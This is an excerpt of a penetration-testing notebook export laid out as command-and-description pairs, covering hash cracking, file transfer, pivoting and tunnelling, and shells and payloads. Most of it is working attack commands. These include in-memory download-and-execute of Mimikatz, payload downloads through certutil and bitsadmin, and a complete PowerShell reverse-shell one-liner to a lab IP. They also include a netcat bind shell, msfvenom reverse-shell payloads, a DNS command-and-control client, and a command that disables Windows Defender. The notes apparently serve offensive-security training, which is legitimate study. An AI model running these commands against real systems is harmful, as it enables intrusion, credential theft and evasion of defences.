      <rich_text family="monospace" background="#000000000000">john --wordlist=rockyou.txt protected-docx.hash</rich_text>
      <rich_text background="#000000000000">

Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.

</rich_text>
      <rich_text family="monospace" background="#000000000000">pdf2john.pl PDF.pdf &gt; pdf.hash</rich_text>
      <rich_text background="#000000000000">

Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.

</rich_text>
      <rich_text family="monospace" background="#000000000000">john --wordlist=rockyou.txt pdf.hash</rich_text>
      <rich_text background="#000000000000">

Runs John in conjunction with a wordlist to crack a pdf hash.

</rich_text>
      <rich_text family="monospace" background="#000000000000">zip2john ZIP.zip &gt; zip.hash</rich_text>
      <rich_text background="#000000000000">

Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.

</rich_text>
      <rich_text family="monospace" background="#000000000000">john --wordlist=rockyou.txt zip.hash</rich_text>
      <rich_text background="#000000000000">

Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.

</rich_text>
      <rich_text family="monospace" background="#000000000000">bitlocker2john -i Backup.vhd &gt; backup.hashes</rich_text>
      <rich_text background="#000000000000">

Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.

</rich_text>
      <rich_text family="monospace" background="#000000000000">file GZIP.gzip</rich_text>
      <rich_text background="#000000000000">

Uses the Linux-based file tool to gather file format information.

</rich_text>
      <rich_text family="monospace" background="#000000000000">for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null | tar xz;done</rich_text>
      <rich_text background="#000000000000">

Script that runs a for-loop to extract files from an archive.</rich_text>
    </node>
  </node>
  <node unique_id="102" master_id="0" name="File Transfer (Winows &amp; Linux)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670980538" ts_lastsave="1670984070">
    <node unique_id="103" master_id="0" name="File Transfer (Windows &amp; Linux)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980548" ts_lastsave="1670980676">
      <rich_text background="#000000000000">
Command &amp; Description

 </rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</rich_text>
      <rich_text background="#000000000000">

Download a file with PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</rich_text>
      <rich_text background="#000000000000">

Execute a file in memory using PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</rich_text>
      <rich_text background="#000000000000">

Upload a file with PowerShell

</rich_text>
      <rich_text family="monospace" background="#000000000000">bitsadmin /transfer n http://10.10.10.32/nc.exe C:Tempnc.exe</rich_text>
      <rich_text background="#000000000000">

Download a file using Bitsadmin

</rich_text>
      <rich_text background="#000000000000" foreground="#ffffa3a34848">certutil.exe -f http://192.168.49.89:80/payload.exe payload.exe</rich_text>
      <rich_text background="#000000000000" foreground="#dcdc8a8adddd">
</rich_text>
      <rich_text background="#000000000000">
Download a file using Certutil

</rich_text>
      <rich_text family="monospace" background="#000000000000">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</rich_text>
      <rich_text background="#000000000000">

Download a file using Wget

</rich_text>
      <rich_text family="monospace" background="#000000000000">curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</rich_text>
      <rich_text background="#000000000000">

Download a file using cURL

</rich_text>
      <rich_text family="monospace" background="#000000000000">php -r '$file = file_get_contents("https://&lt;snip&gt;/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'</rich_text>
      <rich_text background="#000000000000">

Download a file using PHP

</rich_text>
      <rich_text family="monospace" background="#000000000000">scp C:Tempbloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</rich_text>
      <rich_text background="#000000000000">

Upload a file using SCP

</rich_text>
      <rich_text family="monospace" background="#000000000000">scp user@target:/tmp/mimikatz.exe C:Tempmimikatz.exe</rich_text>
      <rich_text background="#000000000000">

Download a file using SCP

</rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"</rich_text>
      <rich_text background="#000000000000">

Invoke-WebRequest using a Chrome User Agent</rich_text>
    </node>
  </node>
  <node unique_id="104" master_id="0" name="Pivoting &amp; Tunneling" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670980709" ts_lastsave="1670984085">
    <node unique_id="105" master_id="0" name="Pivoting and Tunneling" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980718" ts_lastsave="1670980727">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">ifconfig</rich_text>
      <rich_text background="#000000000000">

Linux

</rich_text>
      <rich_text family="monospace" background="#000000000000">ipconfig</rich_text>
      <rich_text background="#000000000000">

Windows-based command that displays all system network configurations.

</rich_text>
      <rich_text family="monospace" background="#000000000000">netstat -r</rich_text>
      <rich_text background="#000000000000">

Command used to display the routing table for all IPv4-based protocols.

</rich_text>
      <rich_text family="monospace" background="#000000000000">nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</rich_text>
      <rich_text background="#000000000000">

Nmap command used to scan a target for open ports allowing SSH or MySQL connections.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</rich_text>
      <rich_text background="#000000000000">

SSH comand used to create an SSH tunnel from a local machine on local port </rich_text>
      <rich_text family="monospace" background="#000000000000">1234</rich_text>
      <rich_text background="#000000000000"> to a remote target using port 3306.

</rich_text>
      <rich_text family="monospace" background="#000000000000">netstat -antp | grep 1234</rich_text>
      <rich_text background="#000000000000">

Netstat option used to display network connections associated with a tunnel created. Using </rich_text>
      <rich_text family="monospace" background="#000000000000">grep</rich_text>
      <rich_text background="#000000000000"> to filter based on local port </rich_text>
      <rich_text family="monospace" background="#000000000000">1234</rich_text>
      <rich_text background="#000000000000"> .

</rich_text>
      <rich_text family="monospace" background="#000000000000">nmap -v -sV -p1234 localhost</rich_text>
      <rich_text background="#000000000000">

Nmap command used to scan a host through a connection that has been made on local port </rich_text>
      <rich_text family="monospace" background="#000000000000">1234</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</rich_text>
      <rich_text background="#000000000000">

SSH command that instructs the ssh client to request the SSH server forward all data via port </rich_text>
      <rich_text family="monospace" background="#000000000000">1234</rich_text>
      <rich_text background="#000000000000"> to </rich_text>
      <rich_text family="monospace" background="#000000000000">localhost:3306</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</rich_text>
      <rich_text background="#000000000000">

SSH command used to perform a dynamic port forward on port </rich_text>
      <rich_text family="monospace" background="#000000000000">9050</rich_text>
      <rich_text background="#000000000000"> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.

</rich_text>
      <rich_text family="monospace" background="#000000000000">tail -4 /etc/proxychains.conf</rich_text>
      <rich_text background="#000000000000">

Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.

</rich_text>
      <rich_text family="monospace" background="#000000000000">proxychains nmap -v -sn 172.16.5.1-200</rich_text>
      <rich_text background="#000000000000">

Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range </rich_text>
      <rich_text family="monospace" background="#000000000000">172.16.5.1-200</rich_text>
      <rich_text background="#000000000000"> with increased verbosity (</rich_text>
      <rich_text family="monospace" background="#000000000000">-v)</rich_text>
      <rich_text background="#000000000000"> ping scan (</rich_text>
      <rich_text family="monospace" background="#000000000000">-sn)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">proxychains nmap -v -Pn -sT 172.16.5.19</rich_text>
      <rich_text background="#000000000000">

Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (</rich_text>
      <rich_text family="monospace" background="#000000000000">-v)</rich_text>
      <rich_text background="#000000000000"> disabling ping discover (</rich_text>
      <rich_text family="monospace" background="#000000000000">-Pn)</rich_text>
      <rich_text background="#000000000000"> and using TCP connect scan type (</rich_text>
      <rich_text family="monospace" background="#000000000000">-sT)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">proxychains msfconsole</rich_text>
      <rich_text background="#000000000000">

Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msf6 &gt; search rdp_scanner</rich_text>
      <rich_text background="#000000000000">

Metasploit search that attempts to find a module called </rich_text>
      <rich_text family="monospace" background="#000000000000">rdp_scanner</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</rich_text>
      <rich_text background="#000000000000">

Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</rich_text>
      <rich_text background="#000000000000">

Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following </rich_text>
      <rich_text family="monospace" background="#000000000000">lhost=</rich_text>
      <rich_text background="#000000000000"> on local port 8080 (</rich_text>
      <rich_text family="monospace" background="#000000000000">LPORT=8080)</rich_text>
      <rich_text background="#000000000000"> Payload will take the form of an executable file called </rich_text>
      <rich_text family="monospace" background="#000000000000">backupscript.exe</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msf6 &gt; use exploit/multi/handler</rich_text>
      <rich_text background="#000000000000">

Used to select the multi-handler exploit module in Metasploit.

</rich_text>
      <rich_text family="monospace" background="#000000000000">scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</rich_text>
      <rich_text background="#000000000000">

Uses secure copy protocol (</rich_text>
      <rich_text family="monospace" background="#000000000000">scp)</rich_text>
      <rich_text background="#000000000000"> transfer the file </rich_text>
      <rich_text family="monospace" background="#000000000000">backupscript.exe</rich_text>
      <rich_text background="#000000000000"> to the specified host and places it in the Ubuntu user's home directory (</rich_text>
      <rich_text family="monospace" background="#000000000000">:~/)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">python3 -m http.server 8123</rich_text>
      <rich_text background="#000000000000">

Uses Python3 to start a simple HTTP server listening on port </rich_text>
      <rich_text family="monospace" background="#000000000000">8123</rich_text>
      <rich_text background="#000000000000">. Can be used to retrieve files from a host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:backupscript.exe"</rich_text>
      <rich_text background="#000000000000">

PowerShell command used to download a file called backupscript.exe from a webserver (</rich_text>
      <rich_text family="monospace" background="#000000000000">172.16.5.129:8123)</rich_text>
      <rich_text background="#000000000000"> then save the file to location specified after </rich_text>
      <rich_text family="monospace" background="#000000000000">-OutFile</rich_text>
      <rich_text background="#000000000000">.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</rich_text>
      <rich_text background="#000000000000">

SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port </rich_text>
      <rich_text family="monospace" background="#000000000000">8080</rich_text>
      <rich_text background="#000000000000"> on the attack host to port </rich_text>
      <rich_text family="monospace" background="#000000000000">80</rich_text>
      <rich_text background="#000000000000"> on the target.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</rich_text>
      <rich_text background="#000000000000">

Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after </rich_text>
      <rich_text family="monospace" background="#000000000000">LHOST=</rich_text>
      <rich_text background="#000000000000"> on port 8080 (</rich_text>
      <rich_text family="monospace" background="#000000000000">LPORT=8080)</rich_text>
      <rich_text background="#000000000000"> Payload takes the form of an executable elf file called backupjob.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</rich_text>
      <rich_text background="#000000000000">

Metasploit command that runs a ping sweep module against the specified network segment (</rich_text>
      <rich_text family="monospace" background="#000000000000">RHOSTS=172.16.5.0/23)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">for i in {1...254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &amp;) ;done</rich_text>
      <rich_text background="#000000000000">

For Loop used on a Linux-based system to discover devices in a specified network segment.

</rich_text>
      <rich_text family="monospace" background="#000000000000">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"</rich_text>
      <rich_text background="#000000000000">

For Loop used on a Windows-based system to discover devices in a specified network segment.

</rich_text>
      <rich_text family="monospace" background="#000000000000">1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}</rich_text>
      <rich_text background="#000000000000">

PowerShell one-liner used to ping addresses 1 • 254 in the specified network segment.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msf6 &gt; use auxiliary/server/socks_proxy</rich_text>
      <rich_text background="#000000000000">

Metasploit command that selects the </rich_text>
      <rich_text family="monospace" background="#000000000000">socks_proxy</rich_text>
      <rich_text background="#000000000000"> auxiliary module.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msf6 auxiliary(server/socks_proxy) &gt; jobs</rich_text>
      <rich_text background="#000000000000">

Metasploit command that lists all currently running jobs.

</rich_text>
      <rich_text family="monospace" background="#000000000000">socks4 127.0.0.1 9050</rich_text>
      <rich_text background="#000000000000">

Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Socks5 127.0.0.1 1080</rich_text>
      <rich_text background="#000000000000">

Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.

</rich_text>
      <rich_text family="monospace" background="#000000000000">msf6 &gt; use post/multi/manage/autoroute</rich_text>
      <rich_text background="#000000000000">

Metasploit command used to select the autoroute module.

</rich_text>
      <rich_text family="monospace" background="#000000000000">meterpreter &gt; help portfwd</rich_text>
      <rich_text background="#000000000000">

Meterpreter command used to display the features of the portfwd command.

</rich_text>
      <rich_text family="monospace" background="#000000000000">meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</rich_text>
      <rich_text background="#000000000000">

Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.

</rich_text>
      <rich_text family="monospace" background="#000000000000">xfreerdp /v:localhost:3300 /u:victor /p:pass@123</rich_text>
      <rich_text background="#000000000000">

Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.

</rich_text>
      <rich_text family="monospace" background="#000000000000">netstat -antp</rich_text>
      <rich_text background="#000000000000">

Used to display all (</rich_text>
      <rich_text family="monospace" background="#000000000000">-a)</rich_text>
      <rich_text background="#000000000000"> network connections with associated process IDs. </rich_text>
      <rich_text family="monospace" background="#000000000000">-t</rich_text>
      <rich_text background="#000000000000"> displays only TCP connections.</rich_text>
      <rich_text family="monospace" background="#000000000000">-n</rich_text>
      <rich_text background="#000000000000"> displays only numerical addresses. </rich_text>
      <rich_text family="monospace" background="#000000000000">-p</rich_text>
      <rich_text background="#000000000000"> displays process IDs associated with each displayed connection.

</rich_text>
      <rich_text family="monospace" background="#000000000000">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</rich_text>
      <rich_text background="#000000000000">

Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port </rich_text>
      <rich_text family="monospace" background="#000000000000">1234</rich_text>
      <rich_text background="#000000000000"> listening on the IP address of the Attack Host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">meterpreter &gt; bg</rich_text>
      <rich_text background="#000000000000">

Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux

</rich_text>
      <rich_text family="monospace" background="#000000000000">socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</rich_text>
      <rich_text background="#000000000000">

Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.

</rich_text>
      <rich_text family="monospace" background="#000000000000">socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</rich_text>
      <rich_text background="#000000000000">

Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.

</rich_text>
      <rich_text family="monospace" background="#000000000000">plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</rich_text>
      <rich_text background="#000000000000">

Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo apt-get install sshuttle</rich_text>
      <rich_text background="#000000000000">

Uses apt-get to install the tool sshuttle.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</rich_text>
      <rich_text background="#000000000000">

Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (</rich_text>
      <rich_text family="monospace" background="#000000000000">172.16.5.0)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo git clone https://github.com/klsecservices/rpivot.git</rich_text>
      <rich_text background="#000000000000">

Clones the rpivot project GitHub repository.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo apt-get install python2.7</rich_text>
      <rich_text background="#000000000000">

Uses apt-get to install python2.7.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</rich_text>
      <rich_text background="#000000000000">

Used to run the rpivot server (</rich_text>
      <rich_text family="monospace" background="#000000000000">server.py)</rich_text>
      <rich_text background="#000000000000"> proxy port </rich_text>
      <rich_text family="monospace" background="#000000000000">9050</rich_text>
      <rich_text background="#000000000000">, server port </rich_text>
      <rich_text family="monospace" background="#000000000000">9999</rich_text>
      <rich_text background="#000000000000"> and listening on any IP address (</rich_text>
      <rich_text family="monospace" background="#000000000000">0.0.0.0)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</rich_text>
      <rich_text background="#000000000000">

Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</rich_text>
      <rich_text background="#000000000000">

Used to run the rpivot client (</rich_text>
      <rich_text family="monospace" background="#000000000000">client.py)</rich_text>
      <rich_text background="#000000000000"> connect to the specified rpivot server on the appropriate port.

</rich_text>
      <rich_text family="monospace" background="#000000000000">proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</rich_text>
      <rich_text background="#000000000000">

Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.

</rich_text>
      <rich_text family="monospace" background="#000000000000">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</rich_text>
      <rich_text background="#000000000000">

Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.

</rich_text>
      <rich_text family="monospace" background="#000000000000">netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</rich_text>
      <rich_text background="#000000000000">

Windows-based command that uses </rich_text>
      <rich_text family="monospace" background="#000000000000">netsh.exe</rich_text>
      <rich_text background="#000000000000"> to configure a portproxy rule called </rich_text>
      <rich_text family="monospace" background="#000000000000">v4tov4</rich_text>
      <rich_text background="#000000000000"> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.

</rich_text>
      <rich_text family="monospace" background="#000000000000">netsh.exe interface portproxy show v4tov4</rich_text>
      <rich_text background="#000000000000">

Windows-based command used to view the configurations of a portproxy rule called v4tov4.

</rich_text>
      <rich_text family="monospace" background="#000000000000">git clone https://github.com/iagox86/dnscat2.git</rich_text>
      <rich_text background="#000000000000">

Clones the </rich_text>
      <rich_text family="monospace" background="#000000000000">dnscat2</rich_text>
      <rich_text background="#000000000000"> project GitHub repository.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</rich_text>
      <rich_text background="#000000000000">

Used to start the dnscat2.rb server running on the specified IP address, port (</rich_text>
      <rich_text family="monospace" background="#000000000000">53)</rich_text>
      <rich_text background="#000000000000"> using the domain </rich_text>
      <rich_text family="monospace" background="#000000000000">inlanefreight.local</rich_text>
      <rich_text background="#000000000000"> with the no-cache option enabled.

</rich_text>
      <rich_text family="monospace" background="#000000000000">git clone https://github.com/lukebaggett/dnscat2-powershell.git</rich_text>
      <rich_text background="#000000000000">

Clones the dnscat2-powershell project Github repository.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module dnscat2.ps1</rich_text>
      <rich_text background="#000000000000">

PowerShell command used to import the dnscat2.ps1 tool.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</rich_text>
      <rich_text background="#000000000000">

PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (</rich_text>
      <rich_text family="monospace" background="#000000000000">-Exec cmd)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">dnscat2&gt; ?</rich_text>
      <rich_text background="#000000000000">

Used to list dnscat2 options.

</rich_text>
      <rich_text family="monospace" background="#000000000000">dnscat2&gt; window -i 1</rich_text>
      <rich_text background="#000000000000">

Used to interact with an established dnscat2 session.

</rich_text>
      <rich_text family="monospace" background="#000000000000">./chisel server -v -p 1234 --socks5</rich_text>
      <rich_text background="#000000000000">

Used to start a chisel server in verbose mode listening on port </rich_text>
      <rich_text family="monospace" background="#000000000000">1234</rich_text>
      <rich_text background="#000000000000"> using SOCKS version 5.

</rich_text>
      <rich_text family="monospace" background="#000000000000">./chisel client -v 10.129.202.64:1234 socks</rich_text>
      <rich_text background="#000000000000">

Used to connect to a chisel server at the specified IP address &amp; port using socks.

</rich_text>
      <rich_text family="monospace" background="#000000000000">git clone https://github.com/utoni/ptunnel-ng.git</rich_text>
      <rich_text background="#000000000000">

Clones the ptunnel-ng project GitHub repository.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo ./autogen.sh</rich_text>
      <rich_text background="#000000000000">

Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo ./ptunnel-ng -r10.129.202.64 -R22</rich_text>
      <rich_text background="#000000000000">

Used to start the ptunnel-ng server on the specified IP address (</rich_text>
      <rich_text family="monospace" background="#000000000000">-r)</rich_text>
      <rich_text background="#000000000000"> corresponding port (</rich_text>
      <rich_text family="monospace" background="#000000000000">-R22)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</rich_text>
      <rich_text background="#000000000000">

Used to connect to a specified ptunnel-ng server through local port 2222 (</rich_text>
      <rich_text family="monospace" background="#000000000000">-l2222)</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">ssh -p2222 -lubuntu 127.0.0.1</rich_text>
      <rich_text background="#000000000000">

SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.

</rich_text>
      <rich_text family="monospace" background="#000000000000">regsvr32.exe SocksOverRDP-Plugin.dll</rich_text>
      <rich_text background="#000000000000">

Windows-based command used to register the SocksOverRDP-PLugin.dll.

</rich_text>
      <rich_text family="monospace" background="#000000000000">netstat -antb |findstr 1080</rich_text>
      <rich_text background="#000000000000">

Windows-based command used to list TCP network connections listening on port 1080.</rich_text>
    </node>
  </node>
  <node unique_id="106" master_id="0" name="Shells &amp; Payloads" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670980805" ts_lastsave="1670984112">
    <node unique_id="108" master_id="0" name="Shells and Payloads" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670980834" ts_lastsave="1670980840">
      <rich_text background="#000000000000">
</rich_text>
      <rich_text family="monospace" background="#000000000000">sudo nc -lvnp &lt;port #&gt;</rich_text>
      <rich_text background="#000000000000">

Starts a </rich_text>
      <rich_text family="monospace" background="#000000000000">netcat</rich_text>
      <rich_text background="#000000000000"> listener on a specified port

</rich_text>
      <rich_text family="monospace" background="#000000000000">nc -nv &lt;ip address of computer with listener started&gt;&lt;port being listened on&gt;</rich_text>
      <rich_text background="#000000000000">

Connects to a netcat listener at the specified IP address and port

</rich_text>
      <rich_text family="monospace" background="#000000000000">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f</rich_text>
      <rich_text background="#000000000000">

Uses netcat to bind a shell (</rich_text>
      <rich_text family="monospace" background="#000000000000">/bin/bash)</rich_text>
      <rich_text background="#000000000000"> specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on

</rich_text>
      <rich_text family="monospace" background="#000000000000">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">Powershell</rich_text>
      <rich_text background="#000000000000"> one
</rich_text>
      <rich_text family="monospace" background="#000000000000">Set-MpPreference -DisableRealtimeMonitoring $true</rich_text>
      <rich_text background="#000000000000">

Powershell command using to disable real time monitoring in </rich_text>
      <rich_text family="monospace" background="#000000000000">Windows Defender</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">use exploit/windows/smb/psexec</rich_text>
      <rich_text background="#000000000000">

Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing </rich_text>
      <rich_text family="monospace" background="#000000000000">smb</rich_text>
      <rich_text background="#000000000000"> &amp; </rich_text>
      <rich_text family="monospace" background="#000000000000">psexec</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">shell</rich_text>
      <rich_text background="#000000000000">

Command used in a meterpreter shell session to drop into a </rich_text>
      <rich_text family="monospace" background="#000000000000">system shell</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; nameoffile.elf</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">MSFvenom</rich_text>
      <rich_text background="#000000000000"> command used to generate a linux-based reverse shell </rich_text>
      <rich_text family="monospace" background="#000000000000">stageless payload</rich_text>
      <rich_text background="#000000000000">

</rich_text>
      <rich_text family="monospace" background="#000000000000">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; nameoffile.exe</rich_text>
      <rich_text background="#000000000000">

MSFvenom command used to generate a Windows-based reverse shell stageless payload

</rich_text>
